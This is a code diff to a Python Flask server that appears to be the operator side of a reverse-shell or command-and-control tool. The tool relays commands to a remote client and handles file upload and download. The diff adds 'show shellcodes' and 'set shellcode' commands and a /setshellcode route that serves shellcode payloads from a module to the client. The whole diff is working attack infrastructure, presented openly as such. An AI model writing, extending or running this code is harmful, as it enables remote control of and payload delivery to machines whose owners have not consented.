@@ -1,8 +1,8 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 __author__      = 'Christophoros Petrou (game0ver)'
-__version__     = '1.4'
+__version__     = '1.5'
 
 import os
 import re
@@ -23,6 +23,8 @@ from flask import (
 from random import randint
 from threading import Thread
 from binascii import hexlify
+from shellcodes import utils
+from importlib import reload
 from flask_talisman import Talisman
 from flask.logging import default_handler
 from base64 import (
@@ -47,7 +49,7 @@ from tornado.httpserver import HTTPServer
 
 # CONSOLE-COLORS
 B, D, RA = Style.BRIGHT, Style.DIM, Style.RESET_ALL
-BL, R, C  = Fore.BLUE, Fore.RED, Fore.CYAN
+BL, R, C, Y  = Fore.BLUE, Fore.RED, Fore.CYAN, Fore.YELLOW
 
 c1, c2, waiting = 0, 0, True
 progress = {
@@ -65,12 +67,14 @@ clientIP = ""
 emptyresponse = ('', 204)
 upload_contents, cmd_contents = "", ""
 
-exit_cmd  = re.compile(r'^exit\s*')
-clear_cmd = re.compile(r'^clear\s*')
-unix_path = re.compile(r'^download ((.+/)*([^/]+))$')
-unix_upld = re.compile(r'^upload (.+/)*([^/]+)$')
-wind_path = re.compile(r'^download ((.+\\)*([^/]+))$')
-wind_upld = re.compile(r'^upload (.+\\)*([^/]+)$')
+exit_cmd        = re.compile(r'^\s*exit\s*')
+clear_cmd       = re.compile(r'^\s*clear\s*')
+unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
+unix_upld       = re.compile(r'^\s*upload\s*(.+/)*([^/]+)$')
+wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
+wind_upld       = re.compile(r'^\s*upload\s*(.+\\)*([^/]+)$')
+set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
+show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to something permanent...
@@ -253,6 +257,28 @@ def handleGET():
             elif clear_cmd.match(cmd):
                 os.system('cls') if os.name == 'nt' else os.system('clear')
                 return emptyresponse
+            elif show_shellcodes.match(cmd):
+                reload(utils)
+                if utils.shellcodes[1][0]:
+                    for k,v in utils.shellcodes.items():
+                        print("{} => {}".format(k, v[0]))
+                else:
+                    print("[x] There are no shellcodes available.")
+                return emptyresponse
+            elif set_shellcode.match(cmd):
+                shc_id = int(set_shellcode.search(cmd).group(1))
+                reload(utils)
+                try:
+                    if utils.shellcodes[shc_id][0]:
+                        return redirect(url_for('setshellcode',
+                            shc_id=shc_id)
+                        )
+                    else:
+                        print("[x] There is no shellcode with id: {}".format(shc_id))
+                        return emptyresponse
+                except KeyError:
+                    print("[x] There is no shellcode with id: {}".format(shc_id))
+                    return emptyresponse
             elif exit_cmd.match(cmd):
                 cmd_contents = cmd
                 waiting = True
@@ -278,6 +304,8 @@ def handlePOST():
                 print('{} successfully downloaded!'.format(filename))
             else:
                 print('{} successfully uploaded!'.format(filename))
+        elif request.headers.get('Shellcode_id'):
+            slowprint("[+] Shellcode successfully set to: {}".format(Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0])+RA)
         else:
             print(request.data[:-1].decode())
     return emptyresponse
@@ -286,6 +314,15 @@ def handlePOST():
 @app.route('/commander/')
 def commander():
     return cmd_contents
+
+@app.route('/setshellcode/<int:shc_id>')
+def setshellcode(shc_id):
+    """
+    INFO: Sets shellcode on client-side to a custom shellcode
+    <shc_id>: An integer specified by the user that corresponds to
+              a custom shellcode from "shellcodes"-dictionary.
+    """
+    return utils.shellcodes[shc_id][1]
 
 @app.route('/upload/<filename>')
 def upload(filename):
